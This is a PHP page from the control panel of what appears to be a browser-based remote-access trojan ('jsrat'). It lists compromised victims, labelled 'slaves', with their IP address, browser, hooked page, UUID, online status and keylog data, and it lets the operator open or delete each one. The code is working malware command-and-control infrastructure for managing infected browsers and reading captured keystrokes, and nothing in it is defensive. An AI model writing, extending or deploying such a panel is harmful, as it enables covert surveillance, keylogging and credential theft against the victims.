<?php
session_start();
if(empty($_SESSION['auth'])) {
	header('Location: login.php');
	die();
}

include '../sys/head.php';

$slaves = $db->table('slaves')->order('lastSeen', 'dec')->get();
?>
<link rel="stylesheet" href="css/custom.css">
<div class="block">
  <div class="title"><strong> Slaves </strong> </div>
    <div class="table-responsive">
      <table class="table table-striped table-sm">
        <thead>
          <tr>
            <th></th>
            <th>IP Addr</th>
            <th>Browser</th>
            <th>Portal</th>
            <th>uuid</th>
						<th></th>
          </tr>
        </thead>
        <tbody>
          <?php
          $i = 1;
          foreach($slaves as $key => $val) {
		foreach($val as $k => $v) {
			$val[$k] = filter_var($v, FILTER_SANITIZE_STRING);
		}
		$browser = (new jsrat)->getBrowser($val['ua']);
		$active = ((time() - $val['lastSeen']) > 70 )?'color:red;':'color:green;';
		echo "<tr onclick=\"manageSlave('{$val['uuid']}', '{$val['keylog']}');\" style=\"cursor:pointer;\" class=\"slave\" id=\"{$val['uuid']}\">";
		echo "<th scope='row'>{$i}</th>";
		echo "<td style=\"{$active}\">{$val['ip']}</td>";
		echo "<td>{$browser['name']}</td>";
		echo "<td>{$val['page']}</td>";
		echo "<td>{$val['uuid']}</td>";
		echo "<td><a href='index.php?delete={$val['uuid']}'>Delete</a></td>";
		echo "</tr>";
		$i++;
          }
          ?>
        </tbody>
      </table>
    </div>
  </div>
